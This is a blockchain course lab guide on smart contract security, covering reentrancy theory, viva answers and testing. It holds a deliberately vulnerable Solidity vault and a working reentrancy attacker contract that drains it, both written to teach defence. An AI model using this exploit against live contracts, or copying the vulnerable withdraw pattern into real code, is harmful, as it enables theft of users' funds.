@@ -1,0 +1,533 @@
+==============================================================================
+LAB 6 - SMART CONTRACT VULNERABILITY ANALYSIS AND TESTING
+THEORY + VIVA QUESTIONS (Blockchain Technology)
+==============================================================================
+
+TABLE OF CONTENTS
+  PART A - Lab Overview and Overall Process
+  PART B - Theory: Common Smart Contract Vulnerabilities
+  PART C - Task 1: Inspecting & Operating Vulnerable Contracts
+  PART D - Task 2: Root-Cause Analysis and Logical Weaknesses
+  PART E - Task 3: Remediation Patterns and Secure Coding Standards
+  PART F - Task 4: Security Testing (Positive vs. Negative Test Cases)
+  PART G - Worked Example & Code Structure (Vulnerable vs. Secure Contract & Attack Simulation)
+  PART H - Theory: Reentrancy, Checks-Effects-Interactions, and Guard Patterns
+  PART I - Automated Security Analysis Tools and Testing Frameworks
+  PART J - Common Mistakes and Examiner Focus
+  PART K - Viva Questions with Answers (Exhaustive)
+  PART L - Quick Revision Cheat Sheet
+
+
+==============================================================================
+PART A - LAB OVERVIEW AND OVERALL PROCESS
+==============================================================================
+
+Goal of the lab
+---------------
+Analyze, exploit, fix, and unit test a vulnerable Solidity smart contract in a local development
+environment (such as Remix IDE, Hardhat, or Foundry) to demonstrate:
+  1. how common smart contract flaws (such as Reentrancy, Missing Access Control, Arithmetic 
+     Bugs, or Unchecked External Calls) manifest in contract code,
+  2. how an attacker exploits these logical flaws to compromise contract state or drain funds,
+  3. how to apply secure coding patterns (e.g., Checks-Effects-Interactions, ReentrancyGuard, 
+     Access Control Modifiers) to remediate the vulnerability,
+  4. how to construct positive (functional) and negative (security) test cases to prove the fix.
+
+The four tasks form one pipeline:
+
+  Task 1: Deploy or inspect the supplied vulnerable Solidity contract and execute its normal functionality.
+  Task 2: Identify and explain the assigned vulnerability or logical weakness (such as missing access control, 
+          unsafe external interaction, improper validation, or incorrect state-update sequence).
+  Task 3: Modify the contract to mitigate/fix the weakness.
+  Task 4: Execute positive and negative/security test cases to demonstrate that legitimate behavior still 
+          works and the vulnerable behavior is prevented.
+
+Overall process
+---------------
+Step 1. Load the supplied vulnerable contract into Remix or your local testing framework.
+Step 2. Deploy the contract using a primary test account (Account A) and execute standard baseline operations 
+        (e.g., depositing Ether, checking balance, initiating standard withdrawals).
+Step 3. Perform code inspection to locate the security flaw. Analyze key vectors:
+        - Are state updates performed AFTER low-level external calls? (Reentrancy vector)
+        - Are critical functions missing `onlyOwner` or role-based checks? (Missing Access Control vector)
+        - Is input validation missing (`require(amount > 0)`)? (Improper Validation vector)
+        - Are low-level call return values left unchecked? (Unchecked External Call vector)
+Step 4. Construct a proof-of-concept (PoC) attack scenario or attack contract to trigger the vulnerability.
+Step 5. Document the root cause, explaining the exact execution trace and state breakdown during the exploit.
+Step 6. Refactor the contract source code applying secure development patterns:
+        - Re-order operations following the Checks-Effects-Interactions (CEI) pattern.
+        - Implement `ReentrancyGuard` or custom state locking modifiers (`mutex`).
+        - Add strict validation rules (`require`, `revert CustomError()`) and access control modifiers.
+Step 7. Re-compile and deploy the remediated contract instance to a new test address.
+Step 8. Execute Positive Test Cases: Verify that legitimate users can still deposit, interact with, and withdraw 
+        funds properly without unexpected reverts.
+Step 9. Execute Negative/Security Test Cases: Run the exploit payload/attack contract against the fixed instance.
+        Demonstrate that the transaction now reverts cleanly (e.g., `Status: 0x0 Failure`, error thrown), 
+        preserving contract funds and state integrity.
+
+What the examiner checks
+  - Diagnosis competency: Clear identification of the root cause rather than guessing symptoms.
+  - Exploit mechanism understanding: Ability to explain how the weakness is triggered step-by-step.
+  - Remediation correctness: Fixing the flaw cleanly without breaking intended business functionality.
+  - Rigorous security testing: Demonstrating both successful standard execution AND blocked attack attempts.
+
+Good output to show
+  - Console trace showing a successful attack on the vulnerable instance (e.g., vault drained).
+  - Side-by-side code comparison showing vulnerable vs. remediated contract lines.
+  - Test runner output showing passing unit tests for both positive scenarios and negative/reverted attack scenarios.
+
+
+==============================================================================
+PART B - THEORY: COMMON SMART CONTRACT VULNERABILITIES
+==============================================================================
+
+B.1 Reentrancy (SWC-107)
+------------------------
+Reentrancy occurs when a contract sends Ether to an external untrusted contract address before updating its internal 
+state records. The receiving contract's fallback/receive function interrupts execution and calls back (re-enters) 
+the vulnerable withdrawal function repeatedly before the original state balance is updated.
+
+B.2 Missing Access Control (SWC-105 / SWC-106)
+-----------------------------------------------
+Critical state-changing or fund-transferring functions (such as `withdrawAll()`, `setOwner()`, or `mint()`) lack 
+authorization checks (e.g., `onlyOwner`). Any arbitrary EOA or contract can call them and modify sensitive state.
+
+B.3 Incorrect State-Update Sequence / CEI Violation
+----------------------------------------------------
+Executing external interactions (such as sending Ether or calling external contract interfaces) BEFORE completing 
+internal state updates (such as zeroing balances or setting flags). This breaks atomic state consistency.
+
+B.4 Improper Input Validation (SWC-128)
+---------------------------------------
+Functions fail to validate function parameters using `require` or `revert`. Examples include allowing 0-value transfers, 
+passing zero addresses (`address(0)`), or passing out-of-bounds array indices.
+
+B.5 Unchecked Low-Level Calls (SWC-104)
+---------------------------------------
+Solidity low-level calls (`address.call{value: x}("")`) return a tuple `(bool success, bytes data)`. If the code ignores 
+the `bool success` return value, execution proceeds even when the external transfer fails, causing state desynchronization.
+
+
+==============================================================================
+PART C - TASK 1: INSPECTING & OPERATING VULNERABLE CONTRACTS
+==============================================================================
+
+C.1 Baseline Contract Inspection
+--------------------------------
+When provided with a contract for analysis, begin by cataloging its structural elements:
+1. State Variables: Identify balance mappings (`mapping(address => uint256)`), ownership variables, and status flags.
+2. External / Public Functions: Note all entry points accessible by arbitrary addresses.
+3. Ether Receiving Functions: Check for `receive() external payable` or `fallback() external payable`.
+
+C.2 Executing Normal Functionality
+-----------------------------------
+Before attempting exploit scenarios, execute intended happy-path transactions:
+1. Deploy contract with Account A (Deployer/Owner).
+2. Deposit Ether from Account B (User 1) and Account C (User 2).
+3. Verify that `getStoreBalance()` reflects total deposited funds.
+4. Execute a partial or full withdrawal from Account B.
+5. Verify that Account B's recorded balance decreases proportionally in storage.
+
+
+==============================================================================
+PART D - TASK 2: ROOT-CAUSE ANALYSIS AND LOGICAL WEAKNESSES
+==============================================================================
+
+D.1 Classic Vulnerable Pattern: Reentrancy
+------------------------------------------
+Consider the following classic vulnerable withdrawal function:
+
+```solidity
+// VULNERABLE FUNCTION
+function withdraw() public {
+    uint256 balance = balances[msg.sender];
+    require(balance > 0, "Insufficient balance");
+
+    // UNINTERRUPTED EXTERNAL CALL BEFORE STATE CHANGE (CEI Violation!)
+    (bool success, ) = msg.sender.call{value: balance}("");
+    require(success, "Transfer failed");
+
+    // STATE UPDATE HAPPENS TOO LATE!
+    balances[msg.sender] = 0;
+}
+```
+
+D.2 Execution Trace of the Reentrancy Exploit
+---------------------------------------------
+Suppose the Vault holds 10 ETH total (5 ETH from User, 5 ETH from Attacker).
+
+1. Attacker contract deposits 1 ETH into Vault. `balances[Attacker]` = 1 ETH. Vault total = 11 ETH.
+2. Attacker calls `withdraw()`.
+3. Vault reads `balances[Attacker]` (1 ETH) -> Check passes (`1 ETH > 0`).
+4. Vault executes `msg.sender.call{value: 1 ETH}("")`.
+5. Control transfers to Attacker Contract's `receive()` function.
+6. Attacker's `receive()` function executes BEFORE step 5 returns, calling `Vault.withdraw()` AGAIN!
+7. Second Execution of `withdraw()`:
+   - Vault checks `balances[Attacker]`. Because `balances[msg.sender] = 0` has NOT executed yet, `balances[Attacker]` is STILL 1 ETH!
+   - Check passes again! Vault sends another 1 ETH to Attacker.
+8. Attacker's `receive()` triggers again, repeating the loop until Vault balance is entirely drained (0 ETH).
+9. Finally, the stack unwinds and `balances[Attacker] = 0` executes multiple times uselessly.
+
+
+==============================================================================
+PART E - TASK 3: REMEDIATION PATTERNS AND SECURE CODING STANDARDS
+==============================================================================
+
+E.1 Pattern 1: Checks-Effects-Interactions (CEI) Pattern
+---------------------------------------------------------
+Always structure function code in three strict phases:
+1. Checks: Validate all inputs, authorization, and state preconditions (`require`).
+2. Effects: Update all internal contract storage variables, mappings, and state records FIRST.
+3. Interactions: Perform external contract calls, token transfers, or native Ether transfers LAST.
+
+Remediated Code using CEI:
+```solidity
+function withdrawCEI() public {
+    // 1. CHECKS
+    uint256 balance = balances[msg.sender];
+    require(balance > 0, "Insufficient balance");
+
+    // 2. EFFECTS (State updated BEFORE external transfer)
+    balances[msg.sender] = 0;
+
+    // 3. INTERACTIONS
+    (bool success, ) = msg.sender.call{value: balance}("");
+    require(success, "Transfer failed");
+}
+```
+
+Why CEI prevents Reentrancy:
+When the attacker tries to re-enter `withdrawCEI()` during the external call phase, `balances[msg.sender]` has already been set to `0`. The `require(balance > 0)` check immediately fails and reverts the reentrant call!
+
+E.2 Pattern 2: ReentrancyGuard (Mutex Lock Pattern)
+---------------------------------------------------
+A state boolean flag acts as a lock to prevent re-entrant calls:
+
+```solidity
+abstract contract ReentrancyGuard {
+    uint256 private constant _NOT_ENTERED = 1;
+    uint256 private constant _ENTERED = 2;
+    uint256 private _status;
+
+    constructor() {
+        _status = _NOT_ENTERED;
+    }
+
+    modifier nonReentrant() {
+        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
+        _status = _ENTERED; // Lock
+        _;
+        _status = _NOT_ENTERED; // Unlock
+    }
+}
+```
+
+E.3 Pattern 3: Strict Access Control and Input Validation
+---------------------------------------------------------
+```solidity
+modifier onlyOwner() {
+    require(msg.sender == owner, "Unauthorized: Not contract owner");
+    _;
+}
+
+function restrictedFunction(uint256 amount) public onlyOwner {
+    require(amount > 0, "Invalid amount");
+    require(address(this).balance >= amount, "Insufficient contract reserves");
+    // State logic
+}
+```
+
+
+==============================================================================
+PART F - TASK 4: SECURITY TESTING (POSITIVE VS. NEGATIVE TEST CASES)
+==============================================================================
+
+F.1 Purpose of Security Testing
+-------------------------------
+Fixing code is insufficient without proving:
+1. Functional Continuity (Positive Testing): Valid users can still perform legitimate operations.
+2. Vulnerability Mitigation (Negative Testing): Attacker payloads that previously succeeded now consistently fail/revert.
+
+F.2 Test Case Matrix Structure
+------------------------------
+
+| Test Case ID | Test Category | Target Contract | Action / Payload | Expected Result | Status |
+| :--- | :--- | :--- | :--- | :--- | :--- |
+| **TC-POS-01** | Positive | Fixed Vault | User A deposits 2 ETH | `balances[UserA] == 2 ETH` | PASS |
+| **TC-POS-02** | Positive | Fixed Vault | User A withdraws 1 ETH | `balances[UserA] == 1 ETH`, 1 ETH sent | PASS |
+| **TC-NEG-01** | Negative | Fixed Vault | Attacker runs reentrancy payload | Transaction REVERTS (`ReentrancyGuard` or `require`), funds safe | PASS |
+| **TC-NEG-02** | Negative | Fixed Vault | Non-owner calls restricted function | Transaction REVERTS (`"Unauthorized"`), state unchanged | PASS |
+
+
+==============================================================================
+PART G - WORKED EXAMPLE & CODE STRUCTURE
+==============================================================================
+
+G.1 Vulnerable Contract & Attacker Contract (Tasks 1 & 2)
+--------------------------------------------------------
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+// ==========================================
+// VULNERABLE VAULT CONTRACT
+// ==========================================
+contract VulnerableVault {
+    mapping(address => uint256) public balances;
+
+    function deposit() public payable {
+        require(msg.value > 0, "Deposit required");
+        balances[msg.sender] += msg.value;
+    }
+
+    // VULNERABLE FUNCTION: Violates Checks-Effects-Interactions
+    function withdraw() public {
+        uint256 amount = balances[msg.sender];
+        require(amount > 0, "No balance");
+
+        // Vulnerable external interaction
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success, "Transfer failed");
+
+        // Delayed state update
+        balances[msg.sender] = 0;
+    }
+
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+
+// ==========================================
+// ATTACKER CONTRACT (REENTRANCY EXPLOIT)
+// ==========================================
+contract ReentrancyAttacker {
+    VulnerableVault public targetVault;
+
+    constructor(address payable _target) {
+        targetVault = VulnerableVault(_target);
+    }
+
+    // Fallback function triggered on receiving Ether
+    receive() external payable {
+        if (address(targetVault).balance >= 1 ether) {
+            targetVault.withdraw(); // Re-entering vulnerable function!
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether, "Need 1 ETH to attack");
+        targetVault.deposit{value: 1 ether}();
+        targetVault.withdraw(); // Initial trigger call
+    }
+
+    function getStolenFunds() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+
+G.2 Remediated Secure Contract (Task 3)
+---------------------------------------
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
+
+// ==========================================
+// REMEDIATED SECURE VAULT CONTRACT
+// ==========================================
+contract SecureVault is ReentrancyGuard {
+    mapping(address => uint256) public balances;
+
+    event Deposited(address indexed user, uint256 amount);
+    event Withdrawn(address indexed user, uint256 amount);
+
+    function deposit() public payable {
+        require(msg.value > 0, "Deposit required");
+        balances[msg.sender] += msg.value;
+        emit Deposited(msg.sender, msg.value);
+    }
+
+    // REMEDIATED FUNCTION: Uses CEI Pattern + ReentrancyGuard modifier
+    function withdraw() public nonReentrant {
+        // 1. CHECKS
+        uint256 amount = balances[msg.sender];
+        require(amount > 0, "No balance");
+
+        // 2. EFFECTS
+        balances[msg.sender] = 0;
+
+        // 3. INTERACTIONS
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success, "Transfer failed");
+
+        emit Withdrawn(msg.sender, amount);
+    }
+
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+```
+
+
+==============================================================================
+PART H - THEORY: REENTRANCY, CHECKS-EFFECTS-INTERACTIONS, AND GUARD PATTERNS
+==============================================================================
+
+H.1 Single-Function vs. Cross-Function Reentrancy
+-------------------------------------------------
+1. Single-Function Reentrancy: Attacker re-enters the exact same function being executed before state updates.
+2. Cross-Function Reentrancy: Attacker calls a DIFFERENT function in the target contract during external call execution that depends on the same un-updated state variable (e.g., calling `transfer()` while inside `withdraw()`).
+
+H.2 Why `transfer()` and `send()` Are No Longer Complete Fixes
+--------------------------------------------------------------
+Historically, developers used `address.transfer(amount)` because it only forwarded 2300 gas to the recipient (enough to log an event, but not enough gas for the receiver to perform a complex reentrant contract call).
+However, EIP-1884 increased opcode gas costs (e.g., `SLOAD`), breaking contracts relying on fixed gas stipends. The modern standard is using `call{value: amount}("")` combined with **ReentrancyGuard** or **CEI**.
+
+
+==============================================================================
+PART I - AUTOMATED SECURITY ANALYSIS TOOLS AND TESTING FRAMEWORKS
+==============================================================================
+
+I.1 Static Analysis Tools (Slither / Solhint)
+---------------------------------------------
+- Slither: Python-based static analysis framework that parses Solidity AST to discover vulnerabilities (such as CEI violations, uninitialized variables, and missing zero-address checks) without running the code.
+
+I.2 Dynamic Analysis / Fuzzing (Echidna / Foundry)
+--------------------------------------------------
+- Fuzzing: Generating thousands of random input transactions to test invariant properties (e.g., "Vault balance must always equal sum of user balances").
+
+I.3 Property-Based Unit Testing in Hardhat/Foundry
+--------------------------------------------------
+- Negative testing uses `vm.expectRevert()` (Foundry) or `expect().to.be.revertedWith()` (Hardhat) to assert that unauthorized or malicious calls fail cleanly.
+
+
+==============================================================================
+PART J - COMMON MISTAKES AND EXAMINER FOCUS
+==============================================================================
+
+Common Mistakes
+---------------
+1. Only identifying a flaw conceptually without being able to demonstrate or trace its execution.
+2. Applying an incomplete fix (e.g., adding `require` checks but keeping state updates after external calls).
+3. Forgetting to test the happy path (positive testing) after applying security fixes, accidentally bricking standard features.
+4. Relying solely on deprecated fixed gas stipends (`transfer`) rather than implementing robust design patterns (CEI/ReentrancyGuard).
+5. Testing fixes without re-deploying to a clean contract address.
+
+Examiner Focus
+--------------
+- Diagnostic Precision: Explaining the precise mechanics of why the vulnerability occurs (e.g., trace execution flow).
+- Correct Pattern Application: Correctly demonstrating Checks-Effects-Interactions or mutex locks.
+- Comprehensive Verification: Running both positive tests (functional correctness) and negative tests (exploit blocked) to validate the fix.
+
+
+==============================================================================
+PART K - VIVA QUESTIONS WITH ANSWERS (EXHAUSTIVE)
+==============================================================================
+
+------------------------- SECTION 1: VULNERABILITY TYPES ---------------------
+
+Q1. What is Reentrancy in smart contracts?
+A. A vulnerability where a contract makes an external call to an untrusted address before updating its internal state, allowing the recipient to call back into the vulnerable function recursively before the original execution finishes.
+
+Q2. What was the DAO Attack?
+A. A famous 2016 exploit where an attacker used a reentrancy vulnerability in a major Ethereum crowdfunding contract to drain 3.6 million Ether, leading to the Ethereum / Ethereum Classic hard fork.
+
+Q3. What is Missing Access Control?
+A. A flaw where sensitive state-changing functions lack authorization constraints (such as `onlyOwner`), allowing arbitrary external accounts to trigger restricted functionality.
+
+Q4. What is an Unchecked Low-Level Call vulnerability?
+A. Occurs when a contract executes a low-level call (`address.call("")`) but fails to verify the boolean success return value, causing contract execution to proceed even if the underlying transfer failed.
+
+Q5. What is the danger of integer overflow/underflow in older Solidity versions?
+A. In Solidity versions < 0.8.0, arithmetic operations exceeding maximum/minimum bit boundaries wrapped around without error (e.g., $0 - 1 = 2^{256}-1$), enabling attackers to forge massive balances.
+
+------------------------- SECTION 2: REMEDIATION PATTERNS --------------------
+
+Q6. What is the Checks-Effects-Interactions (CEI) pattern?
+A. A secure coding standard requiring developers to validate inputs (Checks), update internal storage records (Effects), and interact with external contracts or transfer Ether (Interactions) LAST.
+
+Q7. How does the CEI pattern prevent Reentrancy?
+A. Because internal storage balances are updated to 0 during the Effects phase before any external call occurs. If an attacker attempts to re-enter, the Checks phase reads the updated zero balance and reverts immediately.
+
+Q8. What is a ReentrancyGuard?
+A. A modifier that uses a state boolean/mutex lock (`entered` flag) to block any incoming nested calls to protected functions while a transaction is actively executing.
+
+Q9. Why is `address.transfer()` no longer recommended for sending Ether?
+A. Because it forwards a hardcoded gas stipend of 2300 gas. Future gas cost adjustments (like EIP-1884) can cause legitimate transfers to run out of gas. `call{value: amount}("")` with CEI/ReentrancyGuard is the modern standard.
+
+Q10. How do custom errors save gas during reverts?
+A. Custom errors (introduced in Solidity 0.8.4) encode error names and parameters into 4-byte selectors rather than storing long error string literals in contract memory and storage.
+
+------------------------- SECTION 3: TESTING & VERIFICATION ------------------
+
+Q11. What is the difference between positive and negative security testing?
+A. Positive testing verifies that legitimate users can successfully execute valid features. Negative testing verifies that unauthorized operations, invalid inputs, and attack payloads are correctly blocked and reverted.
+
+Q12. What does `vm.expectRevert()` do in smart contract testing?
+A. It asserts that the subsequent transaction statement MUST fail and revert with a specific error message or selector for the test to pass.
+
+Q13. What is static analysis in smart contract security?
+A. Analyzing contract source code or AST without executing it to detect known vulnerability patterns, code smells, and security violations (using tools like Slither).
+
+Q14. What is Fuzz Testing?
+A. An automated testing method that feeds thousands of random inputs and transaction sequences into smart contract functions to detect unhandled exceptions or invariant breaches.
+
+------------------------- SECTION 4: EVM & SECURITY ARCHITECTURE ------------
+
+Q15. Why does a reverted transaction still consume gas?
+A. Because validators must expend computational resources executing opcodes up to the point where the `revert` statement is encountered; that work must be compensated.
+
+Q16. What happens to contract state when a transaction reverts?
+A. All modifications to state variables, mappings, and balances executed during that transaction are atomically rolled back to their pre-transaction values.
+
+Q17. What is Cross-Function Reentrancy?
+A. A scenario where an attacker re-enters a DIFFERENT function in the same contract during an external call, exploiting shared un-updated state variables.
+
+Q18. What is a Fallback / Receive function's role in an attack?
+A. In an exploit contract, the `receive()` or `fallback()` function executes automatically upon receiving Ether, serving as the entry point to initiate reentrant calls back into the victim contract.
+
+------------------------- SECTION 5: BEST PRACTICES -------------------------
+
+Q19. Why should you avoid using `tx.origin` for access control?
+A. `tx.origin` references the original EOA that initiated the transaction chain. An attacker can trick an owner into interacting with a malicious contract that calls the target contract, passing the `tx.origin` check.
+
+Q20. What is an invariant in smart contract testing?
+A. A core property or condition that must ALWAYS hold true before and after any transaction (e.g., "Total contract balance must equal the sum of all individual user balances").
+
+Q21. What is a Pull-Over-Push payment pattern?
+A. A design pattern where a contract stores pending withdrawals in a mapping and requires users to pull (claim) their funds individually, rather than pushing (sending) Ether to multiple accounts automatically in a loop.
+
+Q22. Why are unhandled loop iterations dangerous in smart contracts?
+A. If a loop iterates over an unbounded dynamic array, the gas required to execute the function can exceed the block gas limit, rendering the function permanently un-executable (Denial of Service).
+
+
+==============================================================================
+PART L - QUICK REVISION CHEAT SHEET
+==============================================================================
+
+  CEI Pattern   : Checks -> Effects (update storage FIRST) -> Interactions (external calls LAST)
+  Reentrancy    : External call executed before state update -> Attacker re-enters function
+  Guard Lock    : `nonReentrant` modifier sets mutex status flag to prevent re-entry
+  Access Control: `require(msg.sender == owner)` or OpenZeppelin `Ownable`
+  Testing       : Positive Tests (happy path works) + Negative Tests (attack payload reverts)
+  Ether Transfer: Use `(bool ok, ) = to.call{value: amt}("")` + ReentrancyGuard
+  State Revert  : Failed transaction rolls back all state changes; gas used up to failure is kept
+  Static Analysis: Slither / Solhint detect code vulnerabilities before deployment
+  Authentication: ALWAYS use `msg.sender`, NEVER `tx.origin`
+
+==============================================================================
+END OF DOCUMENT
+==============================================================================
+```
+
+### Key Highlights of this Lab 6 Guide:
+- **Full Alignment with Lab 6 Tasks:** Complete walkthrough spanning vulnerability inspection, root-cause trace analysis, secure remediation, and unit testing strategy.
+- **Worked Vulnerable vs. Secure Code:** Fully functional Solidity contracts for both the vulnerable vault + attacker payload and the remediated secure contract utilizing CEI and `ReentrancyGuard`.
+- **Comprehensive Theory & Architecture:** Deep-dive sections on Reentrancy, Checks-Effects-Interactions (CEI), Mutex locking patterns, static analysis tools, and negative/security testing frameworks.
+- **Exhaustive Viva Collection:** 22 detailed viva questions and answers categorized into 5 sections covering smart contract security risks, remediation standards, testing methodology, and EVM execution safety.
